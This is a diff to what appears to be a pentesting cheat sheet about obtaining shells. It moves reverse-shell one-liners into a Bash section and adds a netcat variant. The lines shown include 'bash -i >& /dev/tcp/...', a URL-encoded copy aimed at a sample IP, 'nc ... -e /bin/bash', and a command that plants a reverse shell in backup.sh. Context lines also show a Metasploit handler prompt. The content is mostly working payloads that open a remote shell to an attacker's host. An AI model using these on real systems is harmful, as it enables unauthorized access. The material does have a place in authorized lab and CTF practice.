@@ -57,16 +57,6 @@ def choice(a):
 
 ---
 
-## Generic shell:
-
-```bash
-bash -i >& /dev/tcp/IP_ATTCK/PORT 0>&1
-# or try url encoded if it's on web like:
-bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E100%2E1%2F666%200%3E%261
-```
-
----
-
 ## Obtaining root shell
 
 ```shell
@@ -157,6 +147,12 @@ msf5 exploit(multi/handler) > run
 ## Bash
 
 ```sh
+bash -i >& /dev/tcp/IP_ATTCK/PORT 0>&1
+# or try url encoded if it's on web like:
+bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E100%2E1%2F666%200%3E%261
+
+nc IP_ATTCK PORT -e /bin/bash
+
 echo "#!/bin/bash bash -i >& /dev/tcp/10.14.69.1/999 0>&1" > backup.sh
 
 # Encoded on base64
